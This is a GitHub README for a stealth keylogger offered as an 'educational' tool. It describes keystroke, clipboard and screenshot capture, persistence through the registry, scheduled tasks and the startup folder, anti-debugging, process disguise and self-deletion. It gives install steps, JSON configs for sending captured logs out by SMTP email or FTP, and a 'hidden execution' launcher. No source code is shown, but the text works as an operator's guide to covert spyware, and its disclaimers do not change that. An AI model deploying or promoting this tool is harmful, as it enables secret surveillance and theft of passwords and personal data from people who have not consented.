# Advanced Keylogger with Data Exfiltration Detection Bypass

A sophisticated keylogger implementation for educational and research purposes that demonstrates advanced stealth techniques, data exfiltration methods, and anti-detection capabilities.

## ⚠️ LEGAL DISCLAIMER

**This software is for EDUCATIONAL and RESEARCH purposes ONLY.**

- The authors are not responsible for any misuse or illegal activities
- Usage must comply with all local and international laws
- Users are solely responsible for ensuring legal compliance
- Unauthorized surveillance or data collection may be illegal in your jurisdiction

## Features

### Data Capture
- **Keystroke Logging**: Low-level keyboard hook for capturing all keystrokes
- **Clipboard Monitoring**: Real-time clipboard content tracking
- **Screenshot Capture**: Periodic automated screenshots with customizable intervals
- **Encrypted Storage**: Local data storage with AES encryption

### Data Exfiltration
- **Email Exfiltration**: Automated email delivery via SMTP with retry mechanisms
- **FTP Exfiltration**: File transfer to remote FTP servers with scheduling
- **Configurable Intervals**: Customizable exfiltration timing and retry logic

### Stealth & Anti-Detection
- **Process Hiding**: Console window concealment and process name obfuscation
- **Anti-Debugging**: Detection of common debugging tools and environments
- **Timing Randomization**: Variable delays to avoid pattern detection
- **Resource Management**: Low CPU/memory footprint with priority adjustment

### Persistence Mechanisms
- **Registry Startup**: Windows registry-based persistence
- **Scheduled Tasks**: Windows Task Scheduler integration
- **Startup Folder**: User startup folder placement

### Security Features
- **Data Encryption**: AES encryption for all stored data
- **Secure Deletion**: Multi-pass file overwriting for cleanup
- **Configuration Security**: Encrypted configuration storage
- **Self-Destruction**: Optional self-deletion capabilities

## Installation

1. **Clone the repository**:
   ```bash
   git clone https://github.com/Akashbht/Keylogger-with-Data-Exfiltration-Detection-Bypass.git
   cd Keylogger-with-Data-Exfiltration-Detection-Bypass
   ```

2. **Run the installation script**:
   ```bash
   python install.py
   ```

3. **Manual installation** (alternative):
   ```bash
   pip install -r requirements.txt
   ```

## Configuration

The keylogger uses a JSON configuration file (`config.json`) with the following main sections:

### Capture Settings
```json
{
  "capture": {
    "enable_keystrokes": true,
    "enable_clipboard": true,
    "enable_screenshots": true,
    "screenshot_interval": 300,
    "max_log_size_mb": 50
  }
}
```

### Email Exfiltration
```json
{
  "exfiltration": {
    "email": {
      "enabled": true,
      "smtp_server": "smtp.gmail.com",
      "smtp_port": 587,
      "username": "your_email@gmail.com",
      "password": "your_app_password",
      "recipient": "recipient@gmail.com",
      "interval_hours": 24
    }
  }
}
```

### FTP Exfiltration
```json
{
  "exfiltration": {
    "ftp": {
      "enabled": false,
      "server": "ftp.example.com",
      "port": 21,
      "username": "ftp_user",
      "password": "ftp_pass",
      "remote_path": "/logs",
      "interval_hours": 12
    }
  }
}
```

## Usage

### Basic Usage
```bash
python keylogger.py
```

### Windows
```batch
# Visible console
start_keylogger.bat

# Hidden execution
start_hidden.bat
```

### Linux/Unix
```bash
# Start
./start_keylogger.sh

# Stop
./stop_keylogger.sh
```

## Architecture

The keylogger is built with a modular architecture:

- **`keylogger.py`**: Main orchestrator class
- **`config_manager.py`**: Configuration management
- **`data_capture.py`**: Keystroke, clipboard, and screenshot capture
- **`storage_manager.py`**: Encrypted data storage and management
- **`exfiltration_manager.py`**: Email and FTP data exfiltration
- **`stealth_manager.py`**: Stealth operations and persistence

## Dependencies

- `pynput`: Low-level input capture
- `pyperclip`: Clipboard monitoring
- `Pillow`: Screenshot capture
- `pyautogui`: Screen automation
- `cryptography`: Data encryption
- `psutil`: Process management
- `schedule`: Task scheduling
- `pywin32`: Windows-specific features (Windows only)

## Anti-Detection Features

1. **Process Obfuscation**: Mimics legitimate system processes
2. **Timing Randomization**: Irregular intervals to avoid pattern detection
3. **Resource Throttling**: Minimal CPU and memory usage
4. **Anti-Debugging**: Detection and evasion of analysis tools
5. **Dynamic Execution**: Runtime code modification techniques

## Security Considerations

- All captured data is encrypted using AES-256
- Configuration files are protected
- Secure deletion of temporary files
- Optional self-destruction capabilities
- Minimal logging to avoid detection

## Research Applications

This tool can be used for:

- **Security Research**: Understanding keylogger techniques
- **Penetration Testing**: Authorized security assessments
- **Malware Analysis**: Studying evasion techniques
- **Educational Purposes**: Learning about cybersecurity threats

## Legal and Ethical Usage

### ✅ Authorized Use Cases
- Security research in controlled environments
- Penetration testing with proper authorization
- Educational demonstrations with consent
- Malware analysis and reverse engineering

### ❌ Prohibited Use Cases
- Unauthorized surveillance
- Corporate espionage
- Personal data theft
- Any illegal activity

## Contributing

Contributions for educational and research purposes are welcome:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

The authors of this software:

- Provide this tool for educational and research purposes only
- Do not condone or support illegal activities
- Are not responsible for misuse of this software
- Encourage responsible disclosure and ethical research

**Use this software at your own risk and responsibility.**

---

*For questions, issues, or research collaboration, please open an issue on GitHub.*
